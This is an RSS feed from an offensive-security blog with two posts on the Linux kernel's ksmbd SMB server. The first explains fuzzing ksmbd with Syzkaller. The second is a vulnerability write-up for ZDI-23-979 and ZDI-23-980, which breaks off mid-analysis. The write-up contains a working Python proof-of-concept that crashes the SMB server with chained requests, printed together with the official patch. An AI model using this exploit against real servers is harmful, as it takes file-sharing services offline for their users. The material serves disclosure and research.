<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[Pwning Tech]]></title><description><![CDATA[Explore offensive security: vulnerability research, pwn, and nerdy insights. Discover Linux kernel zerodays and techniques, IoT flaws, fuzzing experiments, and HackTheBox writeups.]]></description><link>https://pwning.tech/</link><image><url>https://pwning.tech/favicon.png</url><title>Pwning Tech</title><link>https://pwning.tech/</link></image><generator>Ghost 5.75</generator><lastBuildDate>Mon, 12 Feb 2024 13:49:12 GMT</lastBuildDate><atom:link href="https://pwning.tech/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[Tickling ksmbd: fuzzing SMB in the Linux kernel]]></title><description><![CDATA[Following the adventure of manually discovering network-based vulnerabilities in the Linux kernel, I'm adding ksmbd-fuzzing functionality to the already extensive kernel-fuzzing tool that is Syzkaller.]]></description><link>https://pwning.tech/ksmbd-syzkaller/</link><guid isPermaLink="false">658f44f8d32e980001de21f4</guid><category><![CDATA[Ksmbd]]></category><category><![CDATA[Syzkaller]]></category><category><![CDATA[Fuzzing]]></category><category><![CDATA[Linux Kernel]]></category><category><![CDATA[KCOV]]></category><category><![CDATA[Real World]]></category><dc:creator><![CDATA[notselwyn]]></dc:creator><pubDate>Sat, 16 Sep 2023 13:48:24 GMT</pubDate><content:encoded><![CDATA[<p>This blogpost is the next installment of my series of hands-on no-boilerplate vulnerability research blogposts, intended for time-travelers in the future who want to do Linux kernel vulnerability research for bugs. In this blogpost I&apos;m discussing adding psuedo-syscalls and struct definitions for ksmbd to Syzkaller, setting up an working ksmbd instance, and patching ksmbd in order to collect KCOV. Let&apos;s dive in!</p><h2 id="1-what-are-syzkaller-and-kcov">1. What are Syzkaller and KCOV?</h2><p>Syzkaller is an unsupervised coverage-guided kernel fuzzer, or put differently: it throws generated input at a kernel (through system calls, network packets, et cetera) based on educated-guesses in order to find bugs in that kernel. Syzkaller has builtin support for several kernels, such as Windows, Linux and OpenBSD. A full list can be found in <a href="https://github.com/google/syzkaller">Syzkaller&apos;s Github repository</a>.</p><p>Syzkaller partially bases its prioritization on KCOV (kernel coverage) since it assumes that more coverage = more bugs. For a full explanation of Syzkaller and KCOV please refer to the <em>&quot;Collecting network coverage &#x2014; KCOV&quot;</em> and <em>&quot;Integrating into syzkaller&quot;</em> sections of the <a href="https://xairy.io/articles/syzkaller-external-network#-collecting-network-coverage--kcov" rel="noreferrer">&quot;Looking for Remote Code Execution bugs in the Linux kernel&quot;</a> blogpost by Xairy.io in order to deduplicate content and keep this blogpost as technical as possible.</p><h2 id="2-adding-syzkaller-definitions-for-ksmbd">2. Adding Syzkaller definitions for ksmbd</h2><p>In order to make Syzkaller generate input in an efficient matter, we need to give it the structure of the input. For ksmbd, those inputs are SMB requests and hence we need to provide Syzkaller with the structures for SMB requests. The file with my unauthenticated ksmbd definitions can be found here: <a href="https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/ksmbd-fuzzing/ksmbd.txt"><code>ksmbd.txt</code></a>.</p><p>The syntax for <em>declaring</em> Syzkaller structures and psuedo-syscalls is quite straightforward and well documented in their Github repository. For ksmbd, you can just copy <code>ksmbd.txt</code> to <code>sys/linux/ksmbd.txt</code> in the Syzkaller repository and Syzkaller will automatically index it. When defining Syzkaller structures you should be as tightly emulating the real data as possible. Hence, please note that the structures are marked as <code>[packed]</code>, which means that Syzkaller should not add <em>any</em> padding to the structure, as that will ruin the validity of the SMB request.</p><p>However, <em>defining</em> Syzkaller psuedo-syscalls is not as well documented. In order to define your own psuedo-syscalls, you need to define the functions in <code>executor/common_linux.h</code> in the Syzkaller repository. The code I added for sending the requests is (with explanation below):</p><figure class="kg-card kg-code-card"><pre><code class="language-c">#if SYZ_EXECUTOR || __NR_syz_ksmbd_send_req
#include &lt;netinet/in.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;

#define KSMBD_BUF_SIZE 16000

static long syz_ksmbd_send_req(volatile long a0, volatile long a1, volatile long a2, volatile long a3)
{
	int sockfd;
	int packet_reqlen;
	int errno;
	struct sockaddr_in serv_addr;
	char packet_req[KSMBD_BUF_SIZE]; // max frame size

	debug(&quot;[*]{syz_ksmbd_send_req} entered ksmbd send...\n&quot;);

	if (a0 == 0 || a1 == 0) {
		debug(&quot;[!]{syz_ksmbd_send_req} param empty\n&quot;);
		return -7;
	}

	sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sockfd &lt; 0) {
		debug(&quot;[!]{syz_ksmbd_send_req} failed to create socket\n&quot;);
		return -1;
	}

	memset(&amp;serv_addr, &apos;\0&apos;, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);
	serv_addr.sin_port = htons(445);

	errno = connect(sockfd, (struct sockaddr*)&amp;serv_addr, sizeof(serv_addr));
	if (errno &lt; 0) {
		debug(&quot;[!]{syz_ksmbd_send_req} failed to connect (err: %d)\n&quot;, errno);
		return errno ^ 0xff80000;
	}

	// prepend kcov handle to packet
	packet_reqlen = a1 + 8 &gt; KSMBD_BUF_SIZE ? KSMBD_BUF_SIZE - 8 : a1;
	*(unsigned long*)packet_req = procid + 1;
	memcpy(packet_req + 8, (char*)a0, packet_reqlen);

	if (write(sockfd, (char*)packet_req, packet_reqlen + 8) &lt; 0)
		return -4;

	if (read(sockfd, (char*)a2, a3) &lt; 0)
		return -5;

	if (close(sockfd) &lt; 0)
		return -6;

	debug(&quot;[+]{syz_ksmbd_send_req} successfully returned\n&quot;);

	return 0;
}
#endif
</code></pre><figcaption><p><span style="white-space: pre-wrap;">C source-code for </span><code spellcheck="false" style="white-space: pre-wrap;"><span>syz_ksmbd_send_req</span></code><span style="white-space: pre-wrap;">: a custom psuedo-syscall</span></p></figcaption></figure><p>The function prepends the process ID of the currently running syz-executor to a TCP packet, sends the TCP packet (like an SMB request) to 127.0.0.1:445 and receives a TCP packet (like an SMB response). Prepending the process ID to the packet has todo with kcov and will be explained in section 4.</p><p>The psuedo-syscall can be exclusively whitelisted using the following value in the Syzkaller config (the full config can be found in section 5):</p><figure class="kg-card kg-code-card"><pre><code class="language-json">}
	// ...
	&quot;enable_syscalls&quot;: [
		&quot;syz_ksmbd_send_req&quot;
	],
	// ...
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">A snippet of the &quot;enable_syscalls&quot; key in the Syzkaller config</span></p></figcaption></figure><h2 id="3-setting-up-ksmbd">3. Setting up ksmbd</h2><p>In order to interact with ksmbd, we need to send SMB packets to at 127.0.0.1:445. However when we the executor tries it, it will not able to reach it due to two reasons: </p><ol><li>Ksmbd needs to be started from userland</li><li>Networking namespaces prevent access</li></ol><p>In order to start the ksmbd TCP server in the kernel we need to kickstart it using the userland <a href="https://github.com/cifsd-team/ksmbd-tools">toolset</a>. Specifically, we need to setup an SMB user in order to start the SMB server and run the command to start the ksmbd server. In order to be able to interact with ksmbd in Syzkaller VMs, we need to run those commands in every VM at boot-time. I solved this by creating an systemctl service, which runs a script that kickstarts ksmbd.</p><figure class="kg-card kg-code-card"><pre><code class="language-toml">[Unit]
Description=Ksmbd
After=network.target
StartLimitIntervalSec=0
Type=simple
Restart=always
RestartSec=1

[Service]
User=root
Group=root
ExecStart=/root/start_ksmbd.sh

[Install]
WantedBy=multi-user.target</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>/etc/systemd/system/ksmbd.service</span></code><span style="white-space: pre-wrap;">: a TOML file containing a description of an systemctl service</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-bash">#!/usr/bin/env bash

ksmbd.addshare --add-share=files --options=&quot;path = /tmp 
read only = no&quot;
ksmbd.adduser -a user -p password
ksmbd.mountd -n</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>/root/start_ksmbd.sh</span></code><span style="white-space: pre-wrap;">: a simple shell script that kickstarts ksmbd by running several commands</span></p></figcaption></figure><p>After enabling the service, it should be possible to connect to ksmbd using <code>nc 127.0.0.1 445 -v</code>.</p><p>Lastly, Syzkaller enables networking namespaces by default. The ksmbd service only works on 127.0.0.1:445 in the root-namespace, so the syz-executor instances will not be able to connect to ksmbd since they run in their own namespaces. To bypass this feature, I patched the Syzkaller source-code to avoid creating a network namespace:</p><pre><code class="language-diff">static int do_sandbox_none(void)
{
    // [snip]
#if SYZ_EXECUTOR || SYZ_NET_DEVICES
    initialize_netdevices_init();
#endif
+   /*
    if (unshare(CLONE_NEWNET)) {
        debug(&quot;unshare(CLONE_NEWNET): %d\n&quot;, errno);
    }
+   */
    // Enable access to IPPROTO_ICMP sockets, must be done after CLONE_NEWNET.
    write_file(&quot;/proc/sys/net/ipv4/ping_group_range&quot;, &quot;0 65535&quot;);
+   /*
#if SYZ_EXECUTOR || SYZ_DEVLINK_PCI
    initialize_devlink_pci();
#endif
    // [snip]
#if SYZ_EXECUTOR || SYZ_NET_DEVICES
    initialize_netdevices();
#endif
+   */
#if SYZ_EXECUTOR || SYZ_WIFI
    initialize_wifi_devices();
#endif
    setup_binderfs();

+   /*
    int netns = open(&quot;/proc/1/ns/net&quot;, O_RDONLY);
    // [snip]
    close(netns);
+   */

    loop();
    doexit(1);
}
#endif</code></pre><p>Now, the syz-executor instances run in the (same) root-namespace which means that the ksmbd service is available at 127.0.0.1:445 for syz-executor instances.</p><h2 id="4-adding-kcov-support-to-ksmbd">4. Adding KCOV support to ksmbd</h2><p>When we try to fuzz ksmbd using the Syzkaller setup demonstrated above in section 2 and section 3 we will notice that the Syzkaller coverage page will not show any coverage in ksmbd, even though it gets valid SMB response. The result of that is that Syzkaller will not generate input based on the amount of ksmbd code reached and the compared request values. We do not get any KCOV because the execution flow of sending our SMB request starts at sys_send() and passes through the networking stack, where soft interrupt requests (softirq&apos;s) handles sending and receiving the packet. Because interrupt contexts do not have a process context assigned, they do not support KCOV and stop coverage tracking. Therefore, we need to <em>either</em>:</p><ol><li>Patch the networking subsystem to not use softirq&apos;s</li><li>Patch ksmbd to use remote KCOV</li></ol><p>I started out trying to patch the networking subsystem because I did not know about remote KCOV, but I ended up giving up due to the complexity of the networking subsystem. Hence, that left me exploring the web for alternatives: enter remote KCOV.</p><p>Remote KCOV allows you to (re)start KCOV using an identifier which the KCOV collector (like syz-fuzzer) uses to assign certain KCOV to a certain process (like syz-executor). Specifically, syz-fuzzer user the syz-executor instance PID as KCOV identifier, so we need to pass our process id to ksmbd per connection. Luckily, we can prepend the PID to our SMB packet in syz-executor without ugly side effects due to the way ksmbd works with sockets: we can execute an simple <code>read(sock_fd, &amp;pid, 8)</code> function call at the start of the TCP connection handler to acquire the process id in ksmbd. The codeblocks below contain patches for starting remote KCOV (explanation below):</p><figure class="kg-card kg-code-card"><pre><code class="language-diff">struct ksmbd_conn {
    // [snip]

+   unsigned long         kcov_handle;
};
</code></pre><figcaption><p><span style="white-space: pre-wrap;">C source-code containing a patch for the struct </span><code spellcheck="false" style="white-space: pre-wrap;"><span>ksmbd_conn</span></code></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-diff">int ksmbd_conn_handler_loop(void *p)
{
    struct ksmbd_conn *conn = (struct ksmbd_conn *)p;
    struct ksmbd_transport *t = conn-&gt;transport;
    unsigned int pdu_size, max_allowed_pdu_size;
    char hdr_buf[4] = {0,};
    int size;

    // [snip]

    if (t-&gt;ops-&gt;prepare &amp;&amp; t-&gt;ops-&gt;prepare(t))
        goto out;

+   size = t-&gt;ops-&gt;read(t, (char*)&amp;conn-&gt;kcov_handle, sizeof(conn-&gt;kcov_handle), -1);
+   if (size != sizeof(conn-&gt;kcov_handle))
+       goto out;
+
+   kcov_remote_start(conn-&gt;kcov_handle);

    conn-&gt;last_active = jiffies;
    while (ksmbd_conn_alive(conn)) {
        // [snip]
    }

+   kcov_remote_stop();

out:
    // [snip]
    return 0;
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">C source-code containing a patch for the function </span><code spellcheck="false" style="white-space: pre-wrap;"><span>ksmbd_conn_handler_loop()</span></code></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-diff">static void handle_ksmbd_work(struct work_struct *wk)
{
    struct ksmbd_work *work = container_of(wk, struct ksmbd_work, work);
    struct ksmbd_conn *conn = work-&gt;conn;

+   kcov_remote_start(conn-&gt;kcov_handle);
    atomic64_inc(&amp;conn-&gt;stats.request_served);
    
    __handle_ksmbd_work(work, conn);

    // [snip]

+   kcov_remote_stop();
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">C source-code containing a patch for the function </span><code spellcheck="false" style="white-space: pre-wrap;"><span>handle_ksmbd_work()</span></code></p></figcaption></figure><p>As you can see, we add the <code>kcov_handle</code> property to <code>struct ksmbd_conn</code> to keep track of the KCOV identifier throughout the process of handling an SMB request. Secondly, when an TCP connection gets accepted (and <code>ksmbd_conn_handler_loop</code> gets called) we instantly read the first 8 bytes to <code>kcov_handle</code>, after which the rest of the code will not notice anything with regards to the prepended data. However, <code>ksmbd_conn_handler_loop</code> itself will defer SMB requests within the TCP session so we lose KCOV yet again. Hence, we need to start KCOV again in <code>handle_ksmbd_work</code> which is called for each SMB-request related TCP packet. Luckily, we saved the <code>kcov_handle</code> in <code>struct ksmbd_conn</code> so we can easily access it to restart KCOV.</p><h2 id="5-testing-it">5. Testing it</h2><p>We can recompile syzkaller using:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">make generate -j`nproc`  # generate headers containing our psuedo-syscall
make -j`nproc`  # build binaries</code></pre><figcaption><p><span style="white-space: pre-wrap;">Linux shell commands</span></p></figcaption></figure><p>The config I used for fuzzing (it should be ironed out per system):</p><figure class="kg-card kg-code-card"><pre><code class="language-json">{
	&quot;target&quot;: &quot;linux/amd64&quot;,
	&quot;http&quot;: &quot;0.0.0.0:56741&quot;,
	&quot;workdir&quot;: &quot;workdir&quot;,
	&quot;kernel_obj&quot;: &quot;./linux-v6.4-patched&quot;,
	&quot;image&quot;: &quot;./image/bullseye.img&quot;,
	&quot;sshkey&quot;: &quot;./image/bullseye.id_rsa&quot;,
	&quot;syzkaller&quot;: &quot;/opt/syzkaller&quot;,
	&quot;procs&quot;: 16,
	&quot;type&quot;: &quot;qemu&quot;,
	&quot;sandbox&quot;: &quot;none&quot;,
	&quot;enable_syscalls&quot;: [
		&quot;syz_ksmbd_send_req&quot;
	],
	&quot;vm&quot;: {
		&quot;count&quot;: 24,
		&quot;kernel&quot;: &quot;./linux-v6.4-patched/arch/x86/boot/bzImage&quot;,
		&quot;cpu&quot;: 1,
		&quot;cmdline&quot;: &quot;net.ifnames=0 oops=panic panic_on_warn=1 panic_on_oops=1&quot;,
		&quot;mem&quot;: 2048
	}
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">A json datastructure containing configuration values for Syzkaller</span></p></figcaption></figure><p>When testing the Syzkaller and ksmbd setups demonstrated above, everything should run smoothly without any nasty errors or bugs. While using Syzkaller with the config above I found 4 unique bugs in an Linux 6.4 release:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2024/01/ksmbd.png" class="kg-image" alt loading="lazy" width="921" height="277" srcset="https://pwning.tech/content/images/size/w600/2024/01/ksmbd.png 600w, https://pwning.tech/content/images/2024/01/ksmbd.png 921w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;">The Syzkaller dashboard containing 4 unique bugs (3 times out-of-bounds read and 1 use-after-free write)</span></figcaption></figure><h2 id="6-conclusion">6. Conclusion</h2><p>I&apos;m satisfied with how the fuzzer turned out as it allows me to fuzz unauthenticated SMB requests, but there&apos;s still a long way to go to improve the QoL of (ksmbd) fuzzing:</p><ol><li>Extending the SMB request definitions to support more commands</li><li>Implementing authentication using a psuedo-syscall that returns the session id</li></ol><p>Thank you for reading my blogpost, I hope you learned as much as I did researching and writing about these topics. For questions, job inquiries, and other things, please send an email to <a href="mailto:notselwyn@pwning.tech" rel="noreferrer">notselwyn@pwning.tech</a> (<a href="https://pwning.tech/pgp-notselwyn-pwning-tech-DE800B06B04C6635.asc" rel="noreferrer">PGP key</a>).</p>]]></content:encoded></item><item><title><![CDATA[Unleashing ksmbd: remote exploitation of the Linux kernel (ZDI-23-979, ZDI-23-980)]]></title><description><![CDATA[<p>December 22nd 2022: it&apos;s Christmas Thursday, one of the last workdays before the Christmas vacation starts. Whilst everyone was looking forward to opening presents from friends and family, the Zero Day Initiative decided to give the IT community a present as well: immense stress in the form of</p>]]></description><link>https://pwning.tech/ksmbd/</link><guid isPermaLink="false">658f44f8d32e980001de21f3</guid><category><![CDATA[Real World]]></category><category><![CDATA[Heap Memory]]></category><category><![CDATA[Linux Kernel]]></category><category><![CDATA[Binary Exploitation]]></category><category><![CDATA[Ksmbd]]></category><dc:creator><![CDATA[notselwyn]]></dc:creator><pubDate>Fri, 04 Aug 2023 18:57:34 GMT</pubDate><content:encoded><![CDATA[<p>December 22nd 2022: it&apos;s Christmas Thursday, one of the last workdays before the Christmas vacation starts. Whilst everyone was looking forward to opening presents from friends and family, the Zero Day Initiative decided to give the IT community a present as well: immense stress in the form of <a href="https://www.zerodayinitiative.com/advisories/ZDI-23-1690/"><code>ZDI-22-1690</code></a>, an unauthenticated RCE vulnerability in the Linux kernel&apos;s ksmbd subsystem.</p><p>This vulnerability showed me the way to a buggy subsystem of the Linux kernel: ksmbd. Ksmbd stands for Kernel SMB Daemon which acts as an SMB server (which you may recognize from Windows) in the kernel. SMB is known in the community for the unnecessary complexity and it&apos;s resulting vulnerabilities. Imagine the <a href="https://lwn.net/ml/linux-kernel/202109221850.003A16EC1@keescook/">reaction</a> of the Linux developer community when ksmbd was being introduced in the kernel.</p><p>I wanted to learn more about SMB and the ksmbd subsystem so I decided to do vulnerability research in this subsystem, with results. In this write-up I will present the exploits and technical analyses behind <a href="https://www.zerodayinitiative.com/advisories/ZDI-23-979/"><code>ZDI-23-979</code></a> and <a href="https://www.zerodayinitiative.com/advisories/ZDI-23-980/"><code>ZDI-23-980</code></a>: network-based unauthenticated Denial-of-Service and network-based (un)authenticated Out-of-Bounds read 64KiB.</p><h2 id="an-overview-of-smb">An overview of SMB</h2><p>Server Message Block is a file transfer protocol widely used by Windows OS where it can be used to access a NAS or another computer over a network. The most important features of SMB are file reads and writes, accessing directory information and doing authentication. Since the Windows OS tries to integrate SMB, SMB also has many ways of doing authentication for the Windows ecosystem: NTLMSSP, Kerberos 5, Microsoft Kerberos 5, and Kerberos 5 user-to-user (U2U). Ofcourse, the kernel also supports normal authentication like regular passwords.</p><p>To prevent extensive resource usage (like disk storage and RAM), SMB has a credit system where each command subtracts credits from the session. If the credits reach 0, the session cannot issue more commands.</p><p><strong>N.B. A packet, request and command are different things. The same goes for a session and a connection.</strong></p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2024/01/ksmbd_chained_request.drawio.svg" class="kg-image" alt loading="lazy" width="2203" height="588"><figcaption><span style="white-space: pre-wrap;">An overview of the definitions of an chained SMB request packet.</span></figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2024/01/ksmbd_session.drawio.svg" class="kg-image" alt loading="lazy" width="1123" height="498"><figcaption><span style="white-space: pre-wrap;">An overview of the definitions of an SMB session and connection.</span></figcaption></figure><h2 id="zdi-23-979-null-pointer-dereference-denial-of-service">ZDI-23-979: NULL Pointer Dereference Denial-of-Service</h2><p>ZDI-23-979 is an network-based unauthenticated NULL pointer dereference vulnerability resulting from a logic bug in the session handling of chained SMB request packets. The ksmbd subsystem only handles the session for the first request in the packet, which makes a second request in the packet use the same session instance as well. However, when the first request does not use a session, the second request does consequently not use a session either, even when it is required. </p><p>This could hypothetically result in an auth bypass since it skips the session/auth checks, but instead leads to an NULL pointer dereference since it tries to access properties of the request session.</p><p>Let&apos;s dive in the function <a href="https://elixir.bootlin.com/linux/v6.3.9/source/fs/ksmbd/server.c#L161"><code>__handle_ksmbd_work</code></a>of <code>v6.3.9</code>, the last vulnerable kernel release. This function gets called for every packet from a connection. As you can see, the function does call <code>__process_request</code> for every request in the packet, but only checks the session for the first request in the packet using <code>conn-&gt;ops-&gt;check_user_session(work)</code> (explanation below).</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static void __handle_ksmbd_work(struct ksmbd_work *work,
				struct ksmbd_conn *conn)
{
	u16 command = 0;
	int rc;

	// [snip] (initialize buffers) 

	if (conn-&gt;ops-&gt;check_user_session) {
		rc = conn-&gt;ops-&gt;check_user_session(work);

		// if rc != 0 goto send (auth failed)
		if (rc &lt; 0) {
			command = conn-&gt;ops-&gt;get_cmd_val(work);
			conn-&gt;ops-&gt;set_rsp_status(work,
					STATUS_USER_SESSION_DELETED);
			goto send;
		} else if (rc &gt; 0) {
			rc = conn-&gt;ops-&gt;get_ksmbd_tcon(work);
			if (rc &lt; 0) {
				conn-&gt;ops-&gt;set_rsp_status(work,
					STATUS_NETWORK_NAME_DELETED);
				goto send;
			}
		}
	}

	do {
		rc = __process_request(work, conn, &amp;command);
		if (rc == SERVER_HANDLER_ABORT)
			break;

	    // [snip] (set SMB credits)
	} while (is_chained_smb2_message(work));

	if (work-&gt;send_no_response)
		return;

send:
	// [snip] (send response)
}</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>__handle_ksmbd_work</span></code><span style="white-space: pre-wrap;"> - session handling and request processing per packet.</span></p></figcaption></figure><p>The function <code>conn-&gt;ops-&gt;</code><a href="https://elixir.bootlin.com/linux/v6.3.9/source/fs/ksmbd/smb2pdu.c#L543"><code>check_user_session</code></a><code>(work)</code> checks if the pending request requires a session, and if it does it will check <code>req_hdr-&gt;SessionId</code> for existing sessions whereby <code>req_hdr-&gt;SessionId</code> is randomly generated during SMB login. If the session check succeeds, then <code>work-&gt;sess = ksmbd_session_lookup_all(conn, sess_id)</code> or if the request does not require a session, then <code>work-&gt;sess = NULL</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">int smb2_check_user_session(struct ksmbd_work *work)
{
	struct smb2_hdr *req_hdr = smb2_get_msg(work-&gt;request_buf);
	struct ksmbd_conn *conn = work-&gt;conn;
	unsigned int cmd = conn-&gt;ops-&gt;get_cmd_val(work);
	unsigned long long sess_id;

	/*
	 * SMB2_ECHO, SMB2_NEGOTIATE, SMB2_SESSION_SETUP command do not
	 * require a session id, so no need to validate user session&apos;s for
	 * these commands.
	 */
	if (cmd == SMB2_ECHO_HE || cmd == SMB2_NEGOTIATE_HE ||
	    cmd == SMB2_SESSION_SETUP_HE)
		return 0;

	// [snip] (check conn quality)

	sess_id = le64_to_cpu(req_hdr-&gt;SessionId);

	// [snip] (chained request logic that was unused)

	/* Check for validity of user session */
	work-&gt;sess = ksmbd_session_lookup_all(conn, sess_id);
	if (work-&gt;sess)
		return 1;
	
    // [snip] (invalid session handling)
}</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>smb2_check_user_session</span></code><span style="white-space: pre-wrap;"> - codeblock of SMB validation checks.</span></p></figcaption></figure><p>Obviously, when the first command is i.e. <code>SMB2_ECHO_HE</code> and the second command is i.e. <code>SMB2_WRITE</code>, the <code>work-&gt;sess</code> variable will be <code>NULL</code> in <code>smb2_write()</code>. This will cause a dereference like <code>work-&gt;sess-&gt;x</code> and hence a NULL pointer derefence. Since NULL pointer dereferences panic the kernel thread, the SMB server will be taken offline while the rest of the kernel remains online. The proof-of-concept exploit for this vulnerability is as follows:</p><figure class="kg-card kg-code-card"><pre><code class="language-py">#!/usr/bin/env python3

from impacket import smb3, nmb
from pwn import p64, p32, p16, p8


def main():
    print(&quot;[*] connecting to SMB server (no login)...&quot;)

    try:
        conn = smb3.SMB3(&quot;127.0.0.1&quot;, &quot;127.0.0.1&quot;, sess_port=445, timeout=3)
    except nmb.NetBIOSTimeout:
        print(&quot;[!] SMB server is already offline (connection timeout)&quot;)
        return

    # generate innocent SMB_ECHO request
    request_echo = smb3.SMB3Packet()
    request_echo[&apos;Command&apos;] = smb3.SMB2_ECHO
    request_echo[&quot;Data&quot;] = p16(4) + p16(0)
    request_echo[&quot;NextCommand&quot;] = 64+4  # set NextCommand to indicate request chaining

    # generate innocent SMB_WRITE request
    request_write = smb3.SMB3Packet()
    request_write[&apos;Command&apos;] = smb3.SMB2_WRITE
    request_write[&quot;Data&quot;] = p16(49) + p16(0) + p32(0) + p64(0) + p64(0) + p64(0) + p32(0) + p32(0) + p16(0) + p16(0) + p32(0) + p8(0)
    request_write[&quot;TreeID&quot;] = 0

    # chain SMB_WRITE to SMB_ECHO
    request_echo[&quot;Data&quot;] += request_write.getData()

    print(&apos;[*] sending DoS packet...&apos;)
    conn.sendSMB(request_echo)

    print(&quot;[*] probing server health...&quot;)

    try:
        smb3.SMB3(&quot;127.0.0.1&quot;, &quot;127.0.0.1&quot;, sess_port=445, timeout=3)
        print(&quot;[!] exploit failed - server remains online&quot;)
    except nmb.NetBIOSTimeout:
        print(&quot;[+] exploit succeeded - server is now offline&quot;)


if __name__ == &quot;__main__&quot;:
    main()
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Proof-of-Concept (PoC) exploit for ZDI-23-979 written in Python code.&#xA0;</span></p></figcaption></figure><p>The most important part of the <a href="https://lore.kernel.org/all/20230626180806.105257976@linuxfoundation.org/">patch</a> is moving the session check into the chained request loop, which results into the session check being executed for each chained request in the packet, instead of just the first one.</p><figure class="kg-card kg-code-card"><pre><code class="language-diff">+++ b/fs/ksmbd/server.c
@@ -184,24 +184,31 @@ static void __handle_ksmbd_work(struct k
 		goto send;
 	}
 
-	if (conn-&gt;ops-&gt;check_user_session) {
-		rc = conn-&gt;ops-&gt;check_user_session(work);
-		if (rc &lt; 0) {
-			command = conn-&gt;ops-&gt;get_cmd_val(work);
-			conn-&gt;ops-&gt;set_rsp_status(work,
-					STATUS_USER_SESSION_DELETED);
-			goto send;
-		} else if (rc &gt; 0) {
-			rc = conn-&gt;ops-&gt;get_ksmbd_tcon(work);
+	do {
+		if (conn-&gt;ops-&gt;check_user_session) {
+			rc = conn-&gt;ops-&gt;check_user_session(work);
 			if (rc &lt; 0) {
-				conn-&gt;ops-&gt;set_rsp_status(work,
-					STATUS_NETWORK_NAME_DELETED);
+				if (rc == -EINVAL)
+					conn-&gt;ops-&gt;set_rsp_status(work,
+						STATUS_INVALID_PARAMETER);
+				else
+					conn-&gt;ops-&gt;set_rsp_status(work,
+						STATUS_USER_SESSION_DELETED);
 				goto send;
+			} else if (rc &gt; 0) {
+				rc = conn-&gt;ops-&gt;get_ksmbd_tcon(work);
+				if (rc &lt; 0) {
+					if (rc == -EINVAL)
+						conn-&gt;ops-&gt;set_rsp_status(work,
+							STATUS_INVALID_PARAMETER);
+					else
+						conn-&gt;ops-&gt;set_rsp_status(work,
+							STATUS_NETWORK_NAME_DELETED);
+					goto send;
+				}
 			}
 		}
-	}
 
-	do {
 		rc = __process_request(work, conn, &amp;command);
 		if (rc == SERVER_HANDLER_ABORT)
 			break;
--- a/fs/ksmbd/smb2pdu.c</code></pre><figcaption><p><span style="white-space: pre-wrap;">The official patch for </span><code spellcheck="false" style="white-space: pre-wrap;"><span>ZDI-23-979</span></code><span style="white-space: pre-wrap;">.</span></p></figcaption></figure><h2 id="zdi-23-980-out-of-bounds-read-information-disclosure">ZDI-23-980: Out-Of-Bounds Read Information Disclosure</h2><p>ZDI-23-980 is a network-based (un)authenticated out-of-bounds read in the ksmbd subsystem of the Linux kernel, which allows a user to read up to 65536 consequent bytes from kernel memory. This issue results from an buffer over-read, much like the Heartbleed vulnerability in SSL, where the request packet states that the packet content is larger than it&apos;s actual size, resulting in the parsing of the packet with a fake size. </p><p>This can be exploited by issueing an SMB_WRITE request with size N to file &quot;dump.bin&quot;, whereby the actual request empty is smaller than N. Then, issue an SMB_READ request to download the &quot;dump.bin&quot; file and eventually delete &quot;dump.bin&quot; to remove the exploitation traces.</p><p>When I was researching this vulnerability, I also found an unauthenticated OOB read of 2 bytes using SMB_ECHO, but I figured this was less important than the authenticated OOB read of 65536 bytes due to usability (whether or not this was the right decision is up to debate ;-) ). Hence, the CVE description says it&apos;s authenticated. I will also discuss the SMB_ECHO and explain the exploitation behind that path. The 2-byte OOB read consists of issue&apos;ing an SMB_ECHO command with the last 2 bytes of the packet not being filled in. </p><h3 id="the-underlying-issue">The underlying issue</h3><p>The underlying issue leading to the OOB read is improper validation of the SMB request packet parameter <code>smb2_hdr.NextCommand</code> containing the offset to the next command. When <code>NextCommand</code> is set, the SMB server assumes that the current command/request is the size of <code>NextCommand</code>. Hence, when I have a packet of size N, I can set <code>NextCommand</code> to N+2, and it will assume the packet is N+2 bytes long. This can be seen in action in the <code>ksmbd_smb2_check_message</code> and <code>smb2_calc_size</code> functions. The function <code>ksmbd_smb2_check_message</code> does several assertions/validations:</p><figure class="kg-card kg-code-card"><pre><code class="language-C">hdr-&gt;StructureSize == 64
pdu-&gt;StructureSize2 == smb2_req_struct_sizes[command]  // SMB2_WRITE: 49, SMB2_ECHO: 4
hdr-&gt;NextCommand == pdu-&gt;StructureSize2 + hdr-&gt;StructureSize  // SMB_ECHO
